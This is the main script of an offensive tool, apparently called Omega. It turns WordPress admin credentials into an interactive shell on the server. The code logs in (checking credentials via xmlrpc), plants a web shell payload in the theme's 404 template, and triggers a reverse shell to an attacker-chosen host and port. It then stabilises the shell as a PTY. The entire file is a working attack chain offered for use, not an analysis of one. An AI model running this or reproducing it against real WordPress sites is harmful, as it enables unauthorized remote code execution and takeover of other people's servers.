#!/usr/bin/env python3

import os, threading
from argparse import Namespace
from pwnlib.log import install_default_handler, getLogger
from pwnlib.tubes.listen import listen
from omega_wp.services import (
    LoginService,
    PayloadService,
    ShellService,
    ParametersParserService,
    TerminalService
)

# Init pwntools stuff and safe terminal conf
terminal_service = TerminalService()
install_default_handler()
log = getLogger('pwnlib')

def shell_handler(shell: listen):
    while shell.connected('recv'): pass
    shell.shutdown('send')

    # Restore terminal conf and exit
    terminal_service.restore_tty()

    log.setLevel(1)
    log.info(f'Closed connection to {shell.rhost} port {shell.rport}')
    os._exit(0)


def omega(args: Namespace):
    wp_url = args.wp_url.strip('/')
    username = args.username
    password = args.password
    lhost = args.lhost
    lport = args.lport
    no_pty = args.no_pty

    with log.progress('Trying to get an admin session...') as p:
        login_service = LoginService(wp_url)
        if(login_service.is_xmlrpc_enabled()):
            p.status('Looks like the site has xmlrpc enabled')
            login_service.check_admin_login(username, password)
        wp_admin_session = login_service.get_wp_admin_session(username, password)
        p.success('Got admin session!')

    with log.progress('Dropping payload in the current 404 template...') as p:
        payload_service = PayloadService(wp_url, wp_admin_session)
        web_shell_url = payload_service.drop_payload()
        p.success('Payload ready')

    with log.progress('Getting a reverse shell...') as p:
        shell_service = ShellService(web_shell_url, lhost, lport)
        shell = shell_service.prepare_listener()
        shell_service.execute_rev_shell()
        if (not shell_service.is_rev_shell(shell)):
            raise Exception('No shell received!')
        p.success('Got a shell!')
    
    if(not no_pty and shell_service.is_linux()):
        with log.progress('Trying to stabilize the shell...') as p:
            try:
                shell_service.upgrade_shell(shell)
                terminal_service.pty = True
                p.success('Shell stabilized!')
            except:
                p.failure('Shell stabilization not possible, a non pty shell will be provided')
                
    # Start shell handler to control the closing
    shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
    shell_handler_thread.setDaemon(True)
    shell_handler_thread.start()
    
    # Start interactive mode
    log.info('Switching to interactive mode')
    log.setLevel('error')
    if(terminal_service.pty):
        terminal_service.set_raw_mode()
        shell.sendline(b'') # Make the prompt appear
    shell.interactive()

def main():
    print('Omega - From Wordpress admin to pty\n')

    parameterParserService = ParametersParserService()
    args = parameterParserService.parse_params()

    try:
        omega(args)
    except KeyboardInterrupt:
        log.failure('Interrupted')
    except Exception:
        log.failure('Attack failed!')

if __name__ == '__main__':
    main()
